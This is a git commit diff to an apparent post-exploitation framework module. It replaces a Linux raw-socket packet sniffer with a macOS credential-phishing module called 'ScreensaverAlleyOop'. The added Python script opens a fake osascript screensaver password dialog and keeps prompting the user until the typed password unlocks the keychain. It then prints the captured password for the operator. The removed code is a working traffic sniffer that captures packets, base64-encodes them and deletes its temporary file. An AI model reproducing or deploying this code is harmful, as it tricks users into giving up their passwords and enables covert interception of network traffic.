0449f64c31ecd7331528f425c4310cabb6811778
Alexander Rymdeko-Harvey <killswitch-GUI@users.noreply.github.com>
2016-06-16 21:56:19 -0400

    Update sniffer.py

--- lib/modules/collection/linux/sniffer.py
+++ lib/modules/collection/linux/sniffer.py
@@ -5,71 +5,59 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'PcapSniffer',
+            'Name': 'ScreensaverAlleyOop',
 
             # list of one or more authors for the module
-            'Author': ['@Killswitch_GUI'],
+            'Author': ['@FuzzyNop', '@harmj0y', '@enigma0x3', '@Killswitch-GUI'],
 
             # more verbose multi-line description of the module
-            'Description': 'This module will sniff all interfaces on the target, and write in pcap format.',
+            'Description': ('Launches a screensaver with a prompt for credentials with osascript.',
+                            'This locks the user out until the password can unlock the user keychain.',
+                            'This allows you to prevent Sudo/su failed logon attempts. (credentials till I get them!)'),
 
             # True if the module needs to run in the background
-            'Background': False,
+            'Background' : False,
 
             # File extension to save the file as
-            'OutputExtension': "pcap",
+            'OutputExtension' : "",
 
             # if the module needs administrative privileges
-            'NeedsAdmin': True,
+            'NeedsAdmin' : False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe': False,
+            'OpsecSafe' : False,
 
             # list of any references/other comments
-            'Comments': ['For full comments and code: https://gist.github.com/killswitch-GUI/314e79581f2619a18d94c81d53e5466f']
+            'Comments': [
+                "https://github.com/fuzzynop/FiveOnceInYourLife",
+                "https://github.com/enigma0x3/Invoke-LoginPrompt"
+            ]
         }
 
         # any options needed by the module, settable during runtime
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Agent': {
+            'Agent' : {
                 # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'Agent to run sniffer on.',
+                'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'IpFilter': {
-                'Description'   :   'Set IP to filter on (dst & src).',
-                'Required'      :   False,
-                'Value'         :   '0'
-            },
-            'PortFilter': {
-                'Description'   :   'Set port to filter on (dst & src).',
-                'Required'      :   False,
-                'Value'         :   '0'
-            },
-            'MaxSize': {
-                'Description'   :   'Set max file size to save to disk/memory (MB).',
+            'ExitCount' : {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'Exit Screensaver after # of attempts',
                 'Required'      :   True,
-                'Value'         :   '1'
+                'Value'         :   '15'
             },
-            'MaxPackets': {
-                'Description'   :   'Set max packets to capture.',
+            'Verbose' : {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
-                'Value'         :   '100'
-            },
-            'InMemory': {
-                'Description'   :   'Store binary data in memory, never drop to disk (WARNING: set MaxSize).',
-                'Required'      :   False,
-                'Value'         :   'True'
+                'Value'         :   'False'
             },
 
-            'SavePath': {
-                'Description'   :   'Path of the  file to save (Not used if InMemory is True.',
-                'Required'      :   True,
-                'Value'         :   '/tmp/debug.pcap'
-            }
+
         }
 
         # save off a copy of the mainMenu object to access external functionality
@@ -89,187 +77,89 @@ class Module:
 
     def generate(self):
 
-        savePath = self.options['SavePath']['Value']
-        inMemory = self.options['InMemory']['Value']
-        maxPackets = self.options['MaxPackets']['Value']
-        maxSize = self.options['MaxSize']['Value']
-        portFilter = self.options['PortFilter']['Value']
-        ipFilter = self.options['IpFilter']['Value']
-        if ipFilter != '0':
-            ipFilter = "'" + str(ipFilter) + "'"
+        exitCount = self.options['ExitCount']['Value']
+        verbose = self.options['Verbose']['Value']
 
-        # the Python script itself, with the command to invoke
-        #   for execution appended to the end. Scripts should output
-        #   everything to the pipeline for proper parsing.
-        #
-        # the script should be stripped of comments, with a link to any
-        #   original reference script included in the comments.
-        script = """
-import socket, time
-from datetime import datetime
-import struct
+        script = '''
+import subprocess
+import time
+import sys
 
-def outputPcapPFile(fileName, inMemory=False):
-  pcapHeader = struct.pack("@IHHIIII",0xa1b2c3d4,2,4,0,0,0x040000,1)
-  if inMemory:
-    return pcapHeader
-  with open(str(fileName), 'wb+') as f:
-    f.write(pcapHeader)
+def myrun(cmd):
+    """from http://blog.kagesenshi.org/2008/02/teeing-python-subprocesspopen-output.html"""
+    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    stdout = []
+    while True:
+        line = p.stdout.readline()
+        stdout.append(line)
+        if line == '' and p.poll() != None:
+            break
+    return ''.join(stdout)
 
+def lockchain():
+    # do this to ensure keychain is locked
+    subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)
+    subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)
+    subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)
 
-def ouputPcapPacket(fileName, pLen, packet, inMemory=False):
-  t0, t1, t2, t3, t4, t5, t6, t7, t8 = time.gmtime()
-  tstamp = time.mktime((t0, t1, t2, t3, t4, t5, 0, 0, 0))
-  dt = datetime.now()
-  mstamp = dt.microsecond
-  pcapPacket = struct.pack("@IIII",tstamp,mstamp,pLen,pLen)
-  if inMemory:
-    return pcapPacket
-  with open(str(fileName), 'ab+') as f:
-    f.write(pcapPacket)
-    f.write(packet)
-
-
-def parseEthernetHeader(data):
-    dst = struct.unpack('!BBBBBB',data[:6])        # destination host address
-    src = struct.unpack('!BBBBBB',data[6:12])      # source host address
-    nextType = struct.unpack('!H',data[12:14])[0]  # IP? ARP? RARP? etc
-    return dst, src, nextType
-
-def parseIpHeader(data):
-    ihl = struct.unpack('!B',data[14:15])[0]          # 4 bit version 4 bit ihl
-    tos = struct.unpack('!B',data[15:16])[0]          # Type of service
-    totalLen = struct.unpack('!H',data[16:18])[0]     # IP header length
-    ident = struct.unpack('!H',data[18:20])[0]        # IP ident
-    fragFlags = struct.unpack('!H',data[20:22])[0]    # Frag_and_flags
-    ttl = struct.unpack('!B',data[22:23])[0]          # Packet Time-to-Live
-    proto = struct.unpack('!B',data[23:24])[0]        # Next protocol
-    checksum = struct.unpack('!H',data[24:26])[0]     # checksum
-    sourceIp = struct.unpack('!I',data[26:30])[0]     # Source IP addr
-    destIp = struct.unpack('!I',data[30:34])[0]       # Dest IP addr
-
-    sourceIpStr = parseIpAddr(data[26:30])            # hton ip
-    destIpStr = parseIpAddr(data[30:34])              # hton ip
-    return proto, sourceIpStr, destIpStr
-
-def parseTcpHeader(data):
-  sourcePort = struct.unpack('!H',data[34:36])[0]       # source port (set pointer to end of IP Header)
-  destPort = struct.unpack('!H',data[36:38])[0]         # destination port
-  sequence = struct.unpack('!I',data[38:42])[0]         # sequence number - 32 bits
-  acknowledge = struct.unpack('!I',data[42:46])[0]      # acknowledgement number - 32 bits
-  return sourcePort, destPort
-
-def parseUdpHeader(data):
-  sourcePort = struct.unpack('!H',data[34:36])[0]       # source port (set pointer to end of IP Header)
-  destPort = struct.unpack('!H',data[36:38])[0]         # destination port
-  udpLength = struct.unpack('!H',data[38:40])[0]        # Udp packet length
-  udpChecksum = struct.unpack('!H',data[40:42])[0]      # Udp checksum (optional)
-  return sourcePort, destPort
-
-def parseIcmpHeader(data):
-  typeCode = struct.unpack('!H',data[34:36])[0]       # ICMP Error type
-  code = struct.unpack('!H',data[36:38])[0]           # Type sub code
-  checksum = struct.unpack('!H',data[38:40])[0]       # checksum
-  idCode = struct.unpack('!H',data[40:42])[0]         # ICMP ID code
-  seq = struct.unpack('!H',data[42:44])[0]            # Seq number
-
-def parseIpAddr(data):
-  ipOct = []
-  ipOct.append(str(struct.unpack('!B', data[0:1])[0]))  # octet 1
-  ipOct.append(str(struct.unpack('!B', data[1:2])[0]))  # octet 2  
-  ipOct.append(str(struct.unpack('!B', data[2:3])[0]))  # octet 3
-  ipOct.append(str(struct.unpack('!B', data[3:4])[0]))  # octet 4
-  ipStr = '.'.join(ipOct)
-  return ipStr
-
-def socketSniffer(fileName,ipFilter,portFilter,maxSize, maxPackets, inMemory):
-  try:
-      s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW ,socket.ntohs(0x0003))
-  except socket.error , msg:
-    return
-  # build pcap file header and output
-  memoryPcap = ''
-  if inMemory:
-    memoryPcap += outputPcapPFile(fileName, inMemory=inMemory)
-  else:
-    outputPcapPFile(fileName, inMemory=inMemory)
-  packetCounter = 0
-  sizeCounter = 0
-  maxSize = maxSize * 1024 * 1024
-  while (packetCounter < maxPackets):
-      if (sizeCounter > maxSize):
-        break
-      packet = s.recvfrom(65565)
-      pLen = len(packet[0])
-      if (ipFilter or portFilter):
-        packetOut = False
-        dst, src, nextType = parseEthernetHeader(packet[0])
-        if (hex(nextType) == hex(0x800)):
-          proto, sourceIpStr, destIpStr = parseIpHeader(packet[0])
-          # ICMP (1)
-          # TCP  (6)
-          # UDP  (17)
-          if (proto == 6):
-            sourcePort, destPort = parseTcpHeader(packet[0])
-            if ipFilter and portFilter:
-              if (ipFilter == sourceIpStr or ipFilter == destIpStr) and (portFilter == sourcePort or portFilter == destPort):
-                packetOut = True
-            elif (ipFilter == sourceIpStr or ipFilter == destIpStr):
-              packetOut = True
-            elif (portFilter == sourcePort or portFilter == destPort):
-              packetOut = True
-          elif (proto == 17):
-            sourcePort, destPort = parseUdpHeader(packet[0])
-            if ipFilter and portFilter:
-              if (ipFilter == sourceIpStr or ipFilter == destIpStr) and (portFilter == sourcePort or portFilter == destPort):
-                packetOut = True
-            elif (ipFilter == sourceIpStr or ipFilter == destIpStr):
-              packetOut = True
-            elif (portFilter == sourcePort or portFilter == destPort):
-              packetOut = True
-          else:
-            if (ipFilter == sourceIpStr or ipFilter == destIpStr):
-              packetOut = True
-        if packetOut:
-          if inMemory:
-            memoryPcap += ouputPcapPacket(fileName ,pLen, packet[0], inMemory=inMemory)
-            memoryPcap += packet[0]
-            sizeCounter += pLen
-            packetCounter += 1
-          else:
-            ouputPcapPacket(fileName ,pLen, packet[0], inMemory=inMemory)
-            sizeCounter += pLen
-            packetCounter += 1
-      else: 
-        if inMemory:
-            memoryPcap += ouputPcapPacket(fileName ,pLen, packet[0], inMemory=inMemory)
-            memoryPcap += packet[0]
-            sizeCounter += pLen
-            packetCounter += 1
-        else:
-            ouputPcapPacket(fileName ,pLen, packet[0], inMemory=inMemory)
-            sizeCounter += pLen
-            packetCounter += 1
-  try:
-    if inMemory:
-        data = base64.b64encode(memoryPcap)
-        print data
+def unlockchain(password):
+    cmd = 'security unlock-keychain -p ' + str(password)
+    #process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+    #text = process.communicate()
+    text = myrun(cmd)
+    #print "text: " + str(text)
+    if text == '':
+        return True
     else:
-        f = open('%s', 'rb')
-        data = base64.b64encode(f.read())
-        f.close()
-        run_command('rm -f %s')
-        print data
-  except Exception as e:
-    print e
+        return False
+def retrypassword():
+    process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "ScreenSaver requires your password to continue. Password Incorect!" & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
+    text = process.communicate()
+    return text[0]
 
-fileNameSave = '%s'
-ipFilter = %s
-portFilter = %s
-maxSize = %s
-maxPackets = %s
-inMemory = %s
-socketSniffer(fileNameSave,ipFilter,portFilter,maxSize,maxPackets, inMemory)
-        """ % (savePath, savePath, savePath, ipFilter, portFilter, maxSize, maxPackets, inMemory)
+def parse(text):
+    text = text.split(':')
+    password = text[-1]
+    password.rstrip('\\n')
+    password.rstrip('\\r')
+    password.replace('!','%%21')
+    password.replace('#','%%23')
+    password.replace('$','%%24')
+    return password
+
+def run(exitCount, verbose=False):
+    try:
+        print "Executing..."
+        process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "ScreenSaver requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
+        text = process.communicate()
+        text = text[0]
+        count = 0
+        while True:
+            if exitCount:
+                count += 1
+                if count > exitCount:
+                    break
+            if 'button returned:OK, text returned:' in text:
+                password = parse(text)
+                if password:
+                    lockchain()
+                    # try to get first password
+                    correct = unlockchain(password)
+                    if correct:
+                        # we found the right password!
+                        print '[!] unlock-keychain passed: ' + str(password)
+                        break
+                    else:
+                        print "[*] Bad password: " + str(password)
+                        text = retrypassword()
+            else:
+                text = retrypassword()
+    except Exception as e:
+        print e
+
+exitCount = %s
+verbose = %s
+run(exitCount, verbose=verbose)
+''' %(exitCount, verbose)
 
         return script
